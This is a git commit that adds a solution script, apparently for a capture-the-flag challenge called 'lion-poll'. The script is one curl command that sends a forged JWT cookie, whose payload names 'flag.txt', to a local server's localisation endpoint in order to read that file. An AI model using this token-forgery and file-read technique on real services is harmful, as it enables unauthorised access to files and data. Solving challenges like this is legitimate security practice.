1f68a253bed2bd44ba04a5adf62307a007bb81c9
Anthony Li <me@anli.dev>
2021-05-26 11:40:47 -0400

    Add solution script

---
+++ lion-poll/solution.sh
@@ -0,0 +1,3 @@
+#! /bin/sh
+
+curl --cookie 'lion-token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsYW5ndWFnZSI6ImZsYWcudHh0IiwiaWF0IjoxNjIyMDQzMjEzfQ.NyjAdZfNA2zJjilLpO6WMcnjygRodfWWXVvt9iAd9oE' http://localhost:1337/localisation-file
